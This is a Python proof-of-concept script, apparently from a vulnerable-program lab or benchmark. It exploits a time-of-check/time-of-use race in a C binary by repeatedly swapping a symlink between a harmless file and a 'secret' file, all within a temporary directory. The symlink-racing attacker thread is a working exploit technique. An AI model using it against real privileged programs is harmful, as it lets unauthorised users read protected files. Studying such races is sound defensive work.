#!/usr/bin/env python3
"""Tier-1 TOCTOU / C — race the access/fopen window via symlink swap.

Spawn the binary against a path that is initially a symlink to a
file the attacker can read, then swap to a privileged target during
the race window. Demonstrating this requires the binary to run with
elevated privileges; locally we just demonstrate the access-then-use
sequence and document the race.
"""
import os
import subprocess
import sys
import threading
import tempfile
import time


def main() -> int:
    binary = sys.argv[1] if len(sys.argv) > 1 else os.path.join("build", "vuln")

    with tempfile.TemporaryDirectory() as td:
        target_a = os.path.join(td, "safe.txt")
        target_b = os.path.join(td, "secret.txt")
        link = os.path.join(td, "link.txt")

        with open(target_a, "w") as f: f.write("PUBLIC\n")
        with open(target_b, "w") as f: f.write("ATTACKER_TARGET\n")
        try:
            os.symlink(target_a, link)
        except OSError as e:
            print(f"symlink failed: {e}; running on a filesystem without symlink support?")
            return 1

        # Race: attacker swaps the symlink between access and fopen.
        # In real exploitation a tight loop hits the window; here we
        # demonstrate by repeatedly racing.
        def attacker():
            for _ in range(2000):
                try:
                    os.unlink(link)
                    os.symlink(target_b, link)
                    os.unlink(link)
                    os.symlink(target_a, link)
                except OSError:
                    pass

        t = threading.Thread(target=attacker)
        t.start()
        observed = set()
        for _ in range(50):
            proc = subprocess.run([binary, link], capture_output=True, timeout=5)
            observed.add(proc.stdout.decode(errors="replace").strip())
            if "ATTACKER_TARGET" in observed:
                break
        t.join(timeout=2)

        won = "ATTACKER_TARGET" in observed
        print(f"observed_outputs={observed} won={won}")
        return 0 if won else 1


if __name__ == "__main__":
    sys.exit(main())
